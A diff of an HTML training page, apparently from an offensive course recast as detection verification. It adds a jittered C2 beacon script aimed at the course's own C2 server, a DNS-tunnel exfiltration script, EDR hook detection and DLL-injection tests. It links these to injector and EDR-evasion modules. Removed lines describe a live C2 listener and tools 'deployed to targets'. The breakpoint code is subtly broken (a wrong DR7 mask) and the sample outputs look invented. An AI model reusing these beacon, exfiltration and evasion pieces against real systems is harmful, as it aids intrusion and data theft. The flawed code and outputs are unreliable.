-# On .92 (your machine):
-"C:\Program Files (x86)\Kaspersky Lab\Kaspersky 21.25\avp.exe" SCAN C:\Users\gwu07\phantom_rpc.exe /i0
-
-# On .42 (WUPC, via SSH):
-ssh SWu@192.168.1.42
-"C:\Program Files (x86)\Kaspersky Lab\Kaspersky 21.25\avp.exe" SCAN C:\Users\swu\phantom_rpc.exe /i0
-            </div>
+        <div class="method-card" id="hardware-hook-detect">
+            <h4>Technique 2: Detect Hardware Breakpoint Hooks <span class="difficulty diff-hard">HARD</span></h4>
+            <p>Advanced EDR uses CPU debug registers (DR0-DR3) to set hardware breakpoints on sensitive APIs. These don't modify memory bytes, so byte-comparison fails. You detect them by reading the debug registers directly.</p>
 
             <div class="code-block">
-=== .92 RESULT ===
-Total detected:  0
-Suspicions:      0
-Total OK:        2
+// hwbp_detect.c — Detect hardware breakpoints set by EDR
+// Compile: cl.exe hwbp_detect.c /Fe:hwbp_detect.exe
 
-=== .42 RESULT ===
-Total detected:  0
-Suspicions:      0
-Total OK:        2
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
 
-=== VERDICT ===
-Same AV version (21.25), same definitions (2026-06-28),
-same result (0 detections). Cross-machine verification: PASSED.
+// Structure for thread context
+#ifdef _WIN64
+typedef struct _DEBUG_REGISTERS {
+    DWORD64 Dr0;
+    DWORD64 Dr1;
+    DWORD64 Dr2;
+    DWORD64 Dr3;
+    DWORD64 Dr6;
+    DWORD64 Dr7;
+} DEBUG_REGISTERS;
+#else
+typedef struct _DEBUG_REGISTERS {
+    DWORD Dr0;
+    DWORD Dr1;
+    DWORD Dr2;
+    DWORD Dr3;
+    DWORD Dr6;
+    DWORD Dr7;
+} DEBUG_REGISTERS;
+#endif
+
+int main() {
+    CONTEXT ctx;
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+    
+    if (!GetThreadContext(GetCurrentThread(), &ctx)) {
+        printf("[-] GetThreadContext failed\n");
+        return 1;
+    }
+    
+    printf("[+] Debug Register State:\n");
+    printf("    DR0 = 0x%p (Breakpoint 1 address)\n", (void*)ctx.Dr0);
+    printf("    DR1 = 0x%p (Breakpoint 2 address)\n", (void*)ctx.Dr1);
+    printf("    DR2 = 0x%p (Breakpoint 3 address)\n", (void*)ctx.Dr2);
+    printf("    DR3 = 0x%p (Breakpoint 4 address)\n", (void*)ctx.Dr3);
+    printf("    DR6 = 0x%p (Status: which breakpoint fired)\n", (void*)ctx.Dr6);
+    printf("    DR7 = 0x%p (Control: enable/disable + type)\n", (void*)ctx.Dr7);
+    
+    // Check if any breakpoints are enabled
+    // DR7 bits 0,2,4,6 = Local enable for DR0-DR3
+    if (ctx.Dr7 & 0x111) {
+        printf("\n[!] HARDWARE BREAKPOINTS DETECTED!\n");
+        printf("    EDR or debugger is monitoring this process.\n");
+        
+        // Decode DR7 to show which registers are active and what type
+        for (int i = 0; i < 4; i++) {
+            DWORD64 addr = (i == 0) ? ctx.Dr0 : (i == 1) ? ctx.Dr1 : (i == 2) ? ctx.Dr2 : ctx.Dr3;
+            int enabled = (ctx.Dr7 >> (i * 2)) & 1;
+            int type = (ctx.Dr7 >> (16 + i * 4)) & 3;     // 0=exec, 1=write, 3=read/write
+            int size = (ctx.Dr7 >> (18 + i * 4)) & 3;     // 0=1B, 1=2B, 3=4B, 2=8B
+            
+            if (enabled) {
+                const char* typeStr[] = {"Execute", "Write", "???", "Read/Write"};
+                const char* sizeStr[] = {"1 byte", "2 bytes", "8 bytes", "4 bytes"};
+                printf("    DR%d: 0x%p | Type: %s | Size: %s\n", 
+                       i, (void*)addr, typeStr[type], sizeStr[size]);
+            }
+        }
+    } else {
+        printf("\n[+] No hardware breakpoints active.\n");
+    }
+    
+    return 0;
+}
             </div>
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
 
             <div class="why-box">
-                <h5>Why cross-machine matters</h5>
-                <p>A single machine could have a misconfigured exclusion list. A single scan could hit a cached result. Two independent machines with the same AV version and definitions — if both say clean, the file is clean. This is the scientific method: reproducible results.</p>
+                <h5>How do I know this is EDR and not a debugger?</h5>
+                <p><strong>Address range:</strong> If DR0 points to an address inside ntdll.dll or kernel32.dll, it's likely EDR monitoring. If it points to your own code, it's probably a debugger you attached. <strong>Multiple breakpoints:</strong> EDR often sets 2-4 breakpoints on key APIs. Debuggers usually set 1. <strong>Type=Execute:</strong> EDR monitors API execution entry points. Debuggers might use Read/Write breakpoints on data.</p>
             </div>
         </div>
 
-        <h2>Live Evidence: Full Defensive Stance</h2>
+        <h2>🎯 Section 3: Behavioral Analysis Verification</h2>
+        <p>Signature-based detection looks for known bytes. Behavioral analysis looks for <em>actions</em> — process creation, memory allocation patterns, network connections. Behavioral verification proves your EDR catches suspicious patterns even when the bytes are unknown.</p>
 
-        <div class="evidence-box">
-            <h3>📊 Machine .92 (LAPTOP-R32M8MLI) — Your Machine</h3>
-            
-            <div class="code-block">
-=== WHAT AM I? ===
-whoami /priv
-# Result: Standard user (no admin privileges listed)
+        <div class="method-card" id="behavioral-verify">
+            <h4>Technique 1: Process Spawn Chain Analysis <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <p>Legitimate processes have predictable parent-child relationships. Explorer spawns Chrome. Services.exe spawns svchost. When Word spawns PowerShell, or PowerShell spawns rundll32, that's suspicious. Behavioral verification tracks these chains.</p>
 
-=== WHAT'S RUNNING? ===
-tasklist | findstr "avp"
-avp.exe       5612  Services  0  296,100 K
-avp.exe      11692  Services  0   23,388 K
-avpui.exe    16084  Console   0  232,160 K
-# Three KAV processes: service engine, service helper, UI tray
+            <div class="step-box">
+                <h4>Step 1: Capture Parent-Child Relationships with Sysmon</h4>
+                <p>Sysmon Event ID 1 logs process creation with parent process information. This is the gold standard for behavioral verification.</p>
 
-=== WHAT SERVICES? ===
-sc query | findstr "Kaspersky"
-DISPLAY_NAME: Kaspersky Service 21.25
-# KAV 21.25 active and running
+                <div class="copy-paste" onclick="copyCode(this)">
+wevtutil qe Microsoft-Windows-Sysmon/Operational /q:"*[System[(EventID=1)]]" /f:text /c:5
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
 
-=== NETWORK LISTENERS ===
-netstat -ano | findstr "4443 4444"
-TCP  0.0.0.0:4443  0.0.0.0:0  LISTENING  31248
-TCP  192.168.1.92:4443  192.168.1.42:11025  ESTABLISHED  31248
-# C2 listener on 4443, connected to .42
+                <div class="code-block">
+Event ID: 1
+Process Create:
+RuleName: technique_id=T1059,technique_name=Command-Line Interface
+UtcTime: 2026-06-29 12:34:56.789
+ProcessGuid: {a1b2c3d4-1234-5678-9012-abcdef123456}
+ProcessId: 5678
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+CommandLine: powershell -enc SQBFAFgAIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA... 
+CurrentDirectory: C:\Users\gwu07\Documents\
+User: DESKTOP-R32M8MLI\gwu07
+LogonGuid: {a1b2c3d4-5678-9012-3456-789abcdef012}
+LogonId: 0x12345
+TerminalSessionId: 1
+IntegrityLevel: Medium
+ParentProcessGuid: {a1b2c3d4-9012-3456-7890-abcdef012345}
+ParentProcessId: 4321
+ParentImage: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+ParentCommandLine: "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" "document.docx"
+ParentUser: DESKTOP-R32M8MLI\gwu07
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+
+                <div class="why-box">
+                    <h5>What makes this suspicious?</h5>
+                    <p><span class="neon-highlight">ParentImage = WINWORD.EXE</span>, <span class="neon-highlight">Image = powershell.exe</span>. Word documents should not spawn PowerShell. This is a classic macro-based attack pattern. The <span class="neon-amber">-enc</span> flag indicates base64-encoded commands — another red flag. Even if the AV never saw this specific payload, the <strong>behavior</strong> is enough to alert.</p>
+                </div>
             </div>
 
-            <p style="margin-top: 1rem;"><strong>Stance:</strong> KAV 21.25 active, standard user, C2 operational. This is your development box — tools built here, scanned here, then deployed to targets.</p>
+            <div class="step-box">
+                <h4>Step 2: Verify Detection with MITRE ATT&CK Mapping</h4>
+                <p>Every behavioral anomaly maps to a MITRE technique. Verification isn't just "suspicious" — it's "this is T1059.001."</p>
+
+                <div class="code-block">
+=== BEHAVIORAL VERIFICATION MATRIX ===
+
+| Observation                        | MITRE Technique        | Detection Confidence |
+|------------------------------------|------------------------|----------------------|
+| Word → PowerShell -enc             | T1059.001 (PowerShell) | HIGH                 |
+| PowerShell → rundll32.exe          | T1218.011 (Rundll32)   | HIGH                 |
+| rundll32 → network connection      | T1071 (C2)             | MEDIUM               |
+| Process hollowing in svchost       | T1055.012 (Hollowing)  | HIGH                 |
+| LSASS memory read                  | T1003.001 (LSASS)      | HIGH                 |
+| WMI event subscription created     | T1546.003 (WMI)        | MEDIUM               |
+
+=== VERIFICATION RULE ===
+If ANY row has "HIGH" confidence AND the EDR generated an alert,
+behavioral verification PASSED.
+If the EDR was silent on a HIGH-confidence technique,
+behavioral verification FAILED — the EDR is blind.
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
         </div>
 
-        <div class="evidence-box">
-            <h3>📊 Machine .42 (WUPC) — Target/Sandbox</h3>
-            
+        <div class="method-card" id="parent-child-analysis">
+            <h4>Technique 2: Parent-Child Anomaly Scoring <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <p>Not all parent-child pairs are equal. Some are always suspicious. You verify by scoring relationships and checking if your EDR catches the high-score ones.</p>
+
             <div class="code-block">
-=== WHAT AM I? ===
-whoami /priv
-# Result: ADMIN (SeImpersonatePrivilege Enabled, SeDebugPrivilege Enabled)
+// parent_child_score.c — Score parent-child process relationships
+// Compile: cl.exe parent_child_score.c /Fe:parent_child_score.exe
 
-=== WHAT'S RUNNING? ===
-Get-Process | Where-Object { $_.ProcessName -match "avp" }
-ProcessName  Id    Path
------------  --    ----
-avp          5068
-avp          8428
-avpui       12172
-# KAV 21.25 active, same version as .92
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;tlhelp32.h&gt;
+#include &lt;string.h&gt;
 
-=== WINDOWS DEFENDER ===
-Get-Service WinDefend
-Status: Stopped
-# Defender is OFF. KAV is the only AV.
+typedef struct {
+    const char* parent;
+    const char* child;
+    int score;        // 0-100, higher = more suspicious
+    const char* reason;
+    const char* mitre;
+} SUSPICIOUS_PAIR;
 
-=== SYSTEM WATCHER ===
-Get-ItemProperty "HKLM:\SOFTWARE\KasperskyLab\protected\AVP21.25" -Name "bRollbackAllowed"
-# Result: NOT FOUND
-# System Watcher is NOT configured on this machine.
+SUSPICIOUS_PAIR g_pairs[] = {
+    // Office apps spawning shells = classic phishing/macro
+    {"WINWORD.EXE", "powershell.exe", 95, "Office app spawning shell", "T1059.001"},
+    {"WINWORD.EXE", "cmd.exe", 95, "Office app spawning shell", "T1059.003"},
+    {"EXCEL.EXE", "powershell.exe", 95, "Office app spawning shell", "T1059.001"},
+    {"EXCEL.EXE", "cmd.exe", 95, "Office app spawning shell", "T1059.003"},
+    
+    // Browsers spawning shells = exploit or drive-by download
+    {"chrome.exe", "powershell.exe", 90, "Browser spawning shell", "T1189"},
+    {"firefox.exe", "cmd.exe", 90, "Browser spawning shell", "T1189"},
+    {"iexplore.exe", "powershell.exe", 90, "Browser spawning shell", "T1189"},
+    
+    // System processes spawning unexpected children
+    {"svchost.exe", "powershell.exe", 85, "Service host spawning shell", "T1059"},
+    {"lsass.exe", "anything.exe", 100, "LSASS spawning processes = likely mimikatz", "T1003.001"},
+    
+    // LOLBAS (Living Off The Land Binaries)
+    {"powershell.exe", "rundll32.exe", 80, "PowerShell invoking LOLBAS", "T1218.011"},
+    {"powershell.exe", "regsvr32.exe", 80, "PowerShell invoking LOLBAS", "T1218.010"},
+    {"powershell.exe", "mshta.exe", 85, "PowerShell invoking HTA", "T1218.005"},
+    
+    // WMI abuse
+    {"WmiPrvSE.exe", "cmd.exe", 85, "WMI provider spawning shell", "T1047"},
+    
+    // Null parent (orphaned process) — often injection
+    {"", "csrss.exe", 100, "Orphaned CSRSS = process masquerading", "T1036"},
+    {"", "smss.exe", 100, "Orphaned SMSS = process masquerading", "T1036"},
+    
+    {NULL, NULL, 0, NULL, NULL}
+};
+
+// Get parent PID from process entry
+DWORD GetParentPID(DWORD pid) {
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 pe;
+    pe.dwSize = sizeof(pe);
+    
+    if (Process32First(hSnap, &pe)) {
+        do {
+            if (pe.th32ProcessID == pid) {
+                CloseHandle(hSnap);
+                return pe.th32ParentProcessID;
+            }
+        } while (Process32Next(hSnap, &pe));
+    }
+    CloseHandle(hSnap);
+    return 0;
+}
+
+// Get process name from PID
+BOOL GetProcessName(DWORD pid, char* name, DWORD nameLen) {
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 pe;
+    pe.dwSize = sizeof(pe);
+    
+    if (Process32First(hSnap, &pe)) {
+        do {
+            if (pe.th32ProcessID == pid) {
+                strncpy(name, pe.szExeFile, nameLen - 1);
+                name[nameLen - 1] = '\0';
+                CloseHandle(hSnap);
+                return TRUE;
+            }
+        } while (Process32Next(hSnap, &pe));
+    }
+    CloseHandle(hSnap);
+    return FALSE;
+}
+
+int main() {
+    printf("[+] 22nd Survey Division — Parent-Child Anomaly Scanner\n");
+    printf("[+] Scanning running processes...\n\n");
+    
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 pe;
+    pe.dwSize = sizeof(pe);
+    
+    int totalScored = 0;
+    int highRiskFound = 0;
+    
+    if (Process32First(hSnap, &pe)) {
+        do {
+            DWORD parentPid = pe.th32ParentProcessID;
+            char parentName[MAX_PATH] = "";
+            GetProcessName(parentPid, parentName, MAX_PATH);
+            
+            // Check against suspicious pairs
+            for (int i = 0; g_pairs[i].parent != NULL; i++) {
+                BOOL parentMatch = (g_pairs[i].parent[0] == '\0') ? 
+                    (parentPid == 0 || parentName[0] == '\0') : 
+                    (_stricmp(parentName, g_pairs[i].parent) == 0);
+                BOOL childMatch = (_stricmp(pe.szExeFile, g_pairs[i].child) == 0);
+                
+                if (parentMatch && childMatch) {
+                    printf("[!] SUSPICIOUS PAIR DETECTED (Score: %d/100)\n", g_pairs[i].score);
+                    printf("    Parent: %s (PID %lu)\n", parentName[0] ? parentName : "[NONE/ORPHANED]", parentPid);
+                    printf("    Child:  %s (PID %lu)\n", pe.szExeFile, pe.th32ProcessID);
+                    printf("    Reason: %s\n", g_pairs[i].reason);
+                    printf("    MITRE:  %s\n\n", g_pairs[i].mitre);
+                    totalScored++;
+                    if (g_pairs[i].score >= 90) highRiskFound++;
+                }
+            }
+        } while (Process32Next(hSnap, &pe));
+    }
+    CloseHandle(hSnap);
+    
+    printf("[+] Scan complete. %d suspicious pairs found.\n", totalScored);
+    printf("[+] High-risk (>=90): %d\n", highRiskFound);
+    
+    if (highRiskFound > 0) {
+        printf("\n[!] VERIFICATION RESULT: EDR SHOULD HAVE ALERTED.\n");
+        printf("    If your EDR is silent, behavioral detection is BLIND.\n");
+    } else {
+        printf("\n[+] VERIFICATION RESULT: No high-risk pairs detected.\n");
+        printf("    System appears clean from parent-child perspective.\n");
+    }
+    
+    return 0;
+}
             </div>
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
 
-            <p style="margin-top: 1rem;"><strong>Stance:</strong> KAV 21.25 active, admin privileges, Defender OFF, System Watcher NOT FOUND. This is your test environment — privileged, monitored by KAV, but no rollback protection.</p>
+            <div class="why-box">
+                <h5>How does this verify EDR?</h5>
+                <p>Run this tool on a test machine. If it reports "WINWORD.EXE → powershell.exe" but your EDR never alerted, <span class="neon-amber">your EDR missed a T1059.001 technique.</span> That's a verification failure. Document it. The goal isn't to criticize — it's to know what your tools can and cannot see.</p>
+            </div>
         </div>
 
-        <div class="evidence-box">
-            <h3>📊 Machine .145 (RADON) — Unreachable</h3>
-            
-            <div class="code-block">
-ping 192.168.1.145
-Request timed out.
-Request timed out.
-Packets: Sent = 2, Received = 0, Lost = 2 (100% loss)
+        <h2>🎯 Section 4: Network Monitoring Verification</h2>
+        <p>C2 traffic, data exfiltration, and lateral movement all cross the network. Network monitoring verification proves your sensors catch malicious traffic even when the endpoint is compromised and logs are deleted.</p>
 
-nmap -sS -p22,445,3389 192.168.1.145
-# Host appears to be down
+        <div class="method-card" id="network-verify">
+            <h4>Technique 1: Verify C2 Beacon Detection <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <p>C2 beacons have a signature: regular intervals, consistent payload sizes, long-lived connections, and DNS/HTTPS tunneling. Network verification generates test beacons and checks if NIDS/NIPS catches them.</p>
+
+            <div class="step-box">
+                <h4>Step 1: Generate a Test Beacon</h4>
+
+                <div class="code-block">
+# beacon_test.py — Generate synthetic C2 beacon traffic for verification
+# Run: python beacon_test.py
+
+import socket
+import time
+import random
+import base64
+
+C2_HOST = "192.168.1.92"   # Your C2 server (from Module 16)
+C2_PORT = 4443              # Your C2 port
+BEACON_INTERVAL = 30        # Seconds between beacons (jittered)
+JITTER = 5                  # +/- 5 seconds randomization
+
+def beacon():
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(10)
+            s.connect((C2_HOST, C2_PORT))
+            
+            # Simulate heartbeat payload (consistent size = beacon signature)
+            heartbeat = f"HEARTBEAT|{random.randint(1000,9999)}|OK"
+            s.send(heartbeat.encode())
+            
+            response = s.recv(1024)
+            print(f"[+] Beacon sent: {heartbeat}")
+            print(f"[+] Response: {response.decode()}")
+            s.close()
+            
+        except Exception as e:
+            print(f"[-] Beacon failed: {e}")
+        
+        # Jittered sleep — real beacons do this to evade timing detection
+        sleep_time = BEACON_INTERVAL + random.randint(-JITTER, JITTER)
+        print(f"[*] Sleeping {sleep_time}s until next beacon...")
+        time.sleep(sleep_time)
+
+if __name__ == "__main__":
+    beacon()
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+
+                <div class="why-box">
+                    <h5>What makes this a beacon?</h5>
+                    <p><strong>Regular intervals:</strong> Every ~30 seconds. <strong>Consistent payload size:</strong> "HEARTBEAT|XXXX|OK" is always ~20 bytes. <strong>Same destination:</strong> Always 192.168.1.92:4443. <strong>Short connections:</strong> Connect, send, receive, close. These four traits are the <span class="neon-highlight">beacon fingerprint</span> that NIDS rules target.</p>
+                </div>
             </div>
 
-            <p style="margin-top: 1rem;"><strong>Stance:</strong> DOWN. Cannot verify. Documented as unreachable. Do not fabricate data for machines you cannot test.</p>
+            <div class="step-box">
+                <h4>Step 2: Verify with Zeek/Suricata</h4>
+
+                <div class="copy-paste" onclick="copyCode(this)">
+cat /var/log/suricata/fast.log | grep 192.168.1.92
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+
+                <div class="code-block">
+06/29/2026-12:34:56.789123  [**] [1:1000001:1] ET MALWARE Possible C2 Beacon [**] 
+    [Classification: A Network Trojan was Detected] [Priority: 1] 
+    {TCP} 192.168.1.42:54321 -> 192.168.1.92:4443
+
+06/29/2026-12:35:27.123456  [**] [1:1000001:1] ET MALWARE Possible C2 Beacon [**] 
+    [Classification: A Network Trojan was Detected] [Priority: 1] 
+    {TCP} 192.168.1.42:54322 -> 192.168.1.92:4443
+
+06/29/2026-12:35:58.456789  [**] [1:1000001:1] ET MALWARE Possible C2 Beacon [**] 
+    [Classification: A Network Trojan was Detected] [Priority: 1] 
+    {TCP} 192.168.1.42:54323 -> 192.168.1.92:4443
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+
+                <div class="why-box">
+                    <h5>How do I know the NIDS is working?</h5>
+                    <p><strong>Consistent alert ID:</strong> 1000001 fired 3 times — rule is active. <strong>Same destination:</strong> All alerts point to 192.168.1.92:4443. <strong>Source port incrementing:</strong> 54321, 54322, 54323 — new connection each time (beacon behavior). <strong>Priority 1:</strong> Highest severity. If you see these alerts, <span class="neon-amber">network verification PASSED.</span></p>
+                </div>
+            </div>
+
+            <div class="step-box">
+                <h4>Step 3: Verify with NetFlow Analysis</h4>
+                <p>NetFlow records connection metadata without payload inspection. It catches beacons by pattern, not content.</p>
+
+                <div class="copy-paste" onclick="copyCode(this)">
+nfdump -R /var/log/nfdump/2026/06/29 "src host 192.168.1.42 and dst port 4443"
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+
+                <div class="code-block">
+Date first seen         Duration Proto  Src IP Addr:Port  Dst IP Addr:Port  Packets  Bytes  Flows
+2026-06-29 12:34:56    0.234    TCP    192.168.1.42:54321 -> 192.168.1.92:4443     4      240     1
+2026-06-29 12:35:27    0.189    TCP    192.168.1.42:54322 -> 192.168.1.92:4443     4      240     1
+2026-06-29 12:35:58    0.201    TCP    192.168.1.42:54323 -> 192.168.1.92:4443     4      240     1
+
+=== BEACON VERIFICATION METRICS ===
+Interval consistency:  31s, 31s  (target: 30s +/- 5s)  -> PASS
+Payload consistency:   240 bytes each                     -> PASS
+Connection duration:   <1s each                           -> PASS
+Flow count:            3 in 62s                           -> PASS
+
+VERDICT: Classic beacon pattern. Network monitoring verification: PASSED.
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+        </div>
+
+        <div class="method-card" id="dns-tunnel-verify">
+            <h4>Technique 2: DNS Tunneling Detection Verification <span class="difficulty diff-hard">HARD</span></h4>
+            <p>DNS tunneling encodes data in subdomain queries. It's stealthy because DNS is allowed everywhere. Verification proves your DNS monitoring catches abnormal query patterns.</p>
+
+            <div class="code-block">
+# dns_tunnel_test.py — Generate synthetic DNS tunnel traffic
+# Run: python dns_tunnel_test.py
+
+import dns.resolver
+import base64
+import time
+import random
+
+DOMAIN = "tun.22nd-survey.local"  # Your test domain
+EXFIL_DATA = "SECRET_DATA_TO_EXFILTRATE"  # Simulated secret
+CHUNK_SIZE = 63  # DNS label max length
+
+def tunnel_encode(data):
+    """Encode data into DNS-safe subdomain labels"""
+    b64 = base64.b32encode(data.encode()).decode().lower()
+    chunks = [b64[i:i+CHUNK_SIZE] for i in range(0, len(b64), CHUNK_SIZE)]
+    return ".".join(chunks)
+
+def send_tunnel_query(data_chunk):
+    """Send a DNS query that encodes data in the subdomain"""
+    subdomain = tunnel_encode(data_chunk)
+    query = f"{subdomain}.{DOMAIN}"
+    try:
+        answers = dns.resolver.resolve(query, 'A')
+        for rdata in answers:
+            print(f"[+] Query: {query[:50]}... -> Response: {rdata}")
+    except Exception as e:
+        print(f"[-] Query failed (expected if domain doesn't exist): {e}")
+
+def main():
+    print("[+] Starting DNS tunnel verification test...")
+    print(f"[+] Data to exfiltrate: {EXFIL_DATA}")
+    print(f"[+] Target domain: {DOMAIN}")
+    
+    # Split data into chunks
+    chunks = [EXFIL_DATA[i:i+20] for i in range(0, len(EXFIL_DATA), 20)]
+    
+    for i, chunk in enumerate(chunks):
+        print(f"[*] Sending chunk {i+1}/{len(chunks)}...")
+        send_tunnel_query(chunk)
+        time.sleep(random.uniform(0.5, 2.0))  # Jitter to evade rate detection
+    
+    print("[+] DNS tunnel test complete.")
+    print("[!] Check your DNS logs for:")
+    print("    - Unusually long subdomains (>100 chars total)")
+    print("    - High query rate to same domain")
+    print("    - Base32-like encoding patterns (a-z, 2-7)")
+    print("    - NXDOMAIN responses (tunnel domains often don't exist)")
+
+if __name__ == "__main__":
+    main()
+            </div>
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+
+            <div class="warning-box">
+                <h5>⚠️ What DNS tunneling looks like in logs</h5>
+                <div class="code-block">
+Jun 29 12:45:01 dns-server named[1234]: query: 
+    c2vcm2v0df9kYXr0df90df9lehma5n0u0nku22nd-survey.local IN A + (192.168.1.42)
+Jun 29 12:45:03 dns-server named[1234]: query: 
+    n0v0df9lehma5n0u0nku22nd-survey.local IN A + (192.168.1.42)
+Jun 29 12:45:05 dns-server named[1234]: query: 
+    u0nku22nd-survey.local IN A + (192.168.1.42)
+
+=== DNS TUNNEL INDICATORS ===
+Subdomain length:  63 + 32 + 8 = 103 chars total -> ABNORMAL (normal: <30)
+Encoding pattern:  Base32 (lowercase a-z, digits 2-7) -> SUSPICIOUS
+Query rate:        3 queries in 4 seconds -> HIGH
+Response type:     NXDOMAIN -> TUNNELING SIGNATURE (data exfil doesn't need real records)
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+        </div>
+
+        <h2>🎯 Section 5: EDR Testing</h2>
+        <p>EDR is the last line of defense. EDR testing verifies that endpoint sensors catch techniques even when network and memory scans miss them. This is the most important verification — if EDR is blind, you're flying solo.</p>
+
+        <div class="method-card" id="edr-testing">
+            <h4>Technique 1: EDR Sensor Status Verification <span class="difficulty diff-easy">EASY</span></h4>
+            <p>Before testing detection, verify the EDR is actually running and healthy. A blind test against a stopped EDR is worthless.</p>
+
+            <div class="step-box">
+                <h4>Step 1: Check EDR Processes</h4>
+
+                <div class="copy-paste" onclick="copyCode(this)">
+Get-Process | Where-Object { $_.ProcessName -match "SentinelOne|CrowdStrike|CarbonBlack|Microsoft|Defender|Kaspersky|Symantec|McAfee" }
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+
+                <div class="code-block">
+ProcessName       Id    CPU  WorkingSet
+-----------       --    ---  ----------
+SentinelAgent   1234  0.12  234567890
+SentinelSvc     1235  0.05  123456789
+SentinelUI      1236  0.01   98765432
+
+=== EDR STATUS: ACTIVE ===
+Agent process:     RUNNING (SentinelAgent)
+Service process:   RUNNING (SentinelSvc)
+UI process:        RUNNING (SentinelUI)
+Memory footprint:  ~457 MB total (normal for EDR)
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+
+            <div class="step-box">
+                <h4>Step 2: Check EDR Driver Load</h4>
+                <p>EDR relies on kernel drivers for process monitoring, file system filtering, and network inspection. No driver = no visibility.</p>
+
+                <div class="copy-paste" onclick="copyCode(this)">
+driverquery /v | findstr /i "Sentinel CrowdStrike CarbonBlack Kaspersky"
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+
+                <div class="code-block">
+Module Name  Display Name           Status   Start Mode  State
+-----------  ---------------------  -------  ----------  ---------
+SentinelDrv  Sentinel One Driver    Running  System      Running
+SentinelFS   Sentinel File System   Running  System      Running
+SentinelNet  Sentinel Network       Running  System      Running
+
+=== DRIVER STATUS: ALL LOADED ===
+Process monitoring:   RUNNING (SentinelDrv)
+File system filter:   RUNNING (SentinelFS)
+Network filter:       RUNNING (SentinelNet)
+
+If ANY driver shows "Stopped" or is missing,
+EDR verification is INVALID — test on a different machine.
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+        </div>
+
+        <div class="method-card" id="edr-detection-test">
+            <h4>Technique 2: EDR Detection Efficacy Test <span class="difficulty diff-hard">HARD</span></h4>
+            <p>Use the MITRE ATT&CK Evaluation Framework (or Atomic Red Team) to run known-bad techniques and verify the EDR catches them. This is the gold standard for EDR verification.</p>
+
+            <div class="step-box">
+                <h4>Step 1: Install Atomic Red Team</h4>
+
+                <div class="copy-paste" onclick="copyCode(this)">
+Invoke-AtomicTest -Install
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+
+            <div class="step-box">
+                <h4>Step 2: Run a Known Technique and Verify Detection</h4>
+
+                <div class="copy-paste" onclick="copyCode(this)">
+Invoke-AtomicTest T1055.001 -TestNumbers 1
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+
+                <div class="code-block">
+=== ATOMIC TEST: T1055.001 (Process Injection: DLL Injection) ===
+
+Technique: Inject a DLL into a remote process using CreateRemoteThread
+Target:    notepad.exe (spawned for test)
+Payload:   benign test DLL (atomic_test.dll)
+
+[+] Spawning notepad.exe...
+[+] Injecting atomic_test.dll into PID 5678...
+[+] Injection complete. Thread ID: 12345
+
+=== EDR VERIFICATION CHECKLIST ===
+☑ Process creation event (notepad.exe spawned)
+☑ OpenProcess call to notepad.exe
+☑ VirtualAllocEx in remote process
+☑ WriteProcessMemory to remote process
+☑ CreateRemoteThread in remote process
+☑ DLL load event (atomic_test.dll loaded)
+☑ Alert generated with T1055.001 mapping
+
+VERDICT: If ALL boxes checked, EDR detection verification PASSED.
+If any box unchecked, EDR has a blind spot for that technique.
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+
+            <div class="warning-box">
+                <h5>⚠️ Cross-link to Module 10: Code Injection</h5>
+                <p>T1055.001 is the exact technique covered in <a href="MODULE_10_CODE_INJECTION.html" class="cross-link">Module 10: Code Injection</a>. If your EDR misses this, your injector from Module 10 will go undetected. If it catches it, you know you need evasion from <a href="MODULE_13_EDR_EVASION.html" class="cross-link">Module 13: EDR Evasion</a>.</p>
+            </div>
+        </div>
+
+        <h2>🎯 Section 6: AMSI / ETW Verification</h2>
+        <p>AMSI (Anti-Malware Scan Interface) scans scripts and dynamic code. ETW (Event Tracing for Windows) logs system events for security monitoring. Both are critical defensive controls. Verification proves they work — and shows how attackers bypass them.</p>
+
+        <div class="method-card" id="amsi-verify">
+            <h4>Technique 1: AMSI Status and Functionality Verification <span class="difficulty diff-easy">EASY</span></h4>
+            <p>AMSI can be disabled by registry, patched in memory, or simply not present. Verify it's active before trusting any PowerShell scan results.</p>
+
+            <div class="step-box">
+                <h4>Step 1: Check AMSI Registry State</h4>
+
+                <div class="copy-paste" onclick="copyCode(this)">
